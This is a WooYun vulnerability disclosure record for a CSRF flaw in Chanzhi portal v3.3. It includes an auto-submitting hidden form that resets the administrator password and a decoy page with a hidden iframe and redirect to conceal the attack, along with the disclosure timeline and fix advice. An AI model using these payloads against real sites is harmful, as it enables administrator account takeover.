{"id": 39794, "wybug_id": "wooyun-2015-093225", "wybug_title": "蝉知企业门户系统 v3.3csrf修改管理员密码", "wybug_corp": "chanzhi.org", "wybug_author": "蛇精病", "wybug_date": "2015-01-28 11:10", "wybug_open_date": "2015-04-02 10:23", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["通用", "蛇精病", "蝉知企业"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-02：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： 蝉知企业门户系统 v3.3csrf修改管理员密码 详细说明：  蝉知企业门户系统 v3.3最新版本 存在csrf漏洞而且我测试的时候发现，即使修改了密码，管理员也不会马上需要重新登陆，所以配合我的回旋镖，可以达到神不知鬼不觉的修改其管理密码接下来，我就来详细的演示漏洞过程   漏洞证明：  1、我们进入后台，发现没有添加管理员，那么我们来尝试一下修改管理员密码\n\n很有意思，我们发现修改管理员的密码，不需要验证原密码~~~好危险撒！那我们再来抓包截断看看有没有token之类的验证2、用burpsuite截断\n\n我的小伙伴们都惊呆了 有木有？？没有验证，就两个password3、构造表单吧!\n<html>  <body>    <form id=\"post123\" name=\"post123\" action=\"http://127.0.0.1/admin.php?m=user&f=changepassword\" method=\"POST\">      <input type=\"hidden\" name=\"password1\" value=\"wuyun123\" />      <input type=\"hidden\" name=\"password2\" value=\"wuyun123\" />        <script>        document.getElementById('post123').submit();    </script>    </form>  </body></html>\n表单构造好了，但是修改好了之后随便不会提示修改了密码，但是会自动跳转到后台，这样就会被管理员发现或者产生怀疑了~~肿么破？？？我们利用回旋镖~4、我们新建一个html，代码如下\n<html><table style=\"left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;\"><tbody><tr><td style=\"color:#FFFFFF;z-index: 6000;vertical-align:top;\"><h1>乌云测试</h1></td></tr></tbody></table><<meta http-equiv=\"refresh\" content=\"4;url=http://www.wooyun.org/\"> <!--设置一个正常的跳转页面！--><title>test</title><iframe src=\"http://127.0.0.1/test.html\"></iframe><!--csrf攻击页面的地址！--></html>\n5、这样我们只要访问这个test页面之后就可以修改其密码，而且这个页面会自动跳转到你想跳转的地方（当然，这个页面你可以适度美化，掩饰）\n\nok，漏洞证明+攻击过程演示完毕   修复方案：  首先是修改密码这里，加一个原密码验证，还有就是加token验证，防御csrf攻击！   版权声明：转载请注明来源 蛇精病@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 10:23 厂商回复：  最新状态： 2015-03-19：抱歉，邮件没有收到。已经确认。谢谢。  ", "replys": "漏洞评价：\n评论\n     2015-03-19 16:38 |    \t\t蛇精病 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:10        | 你连棒棒糖都没有，还谈什么狗屁爱情？)\t\t \n  @chanzhi.org  没关系~嘿嘿    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}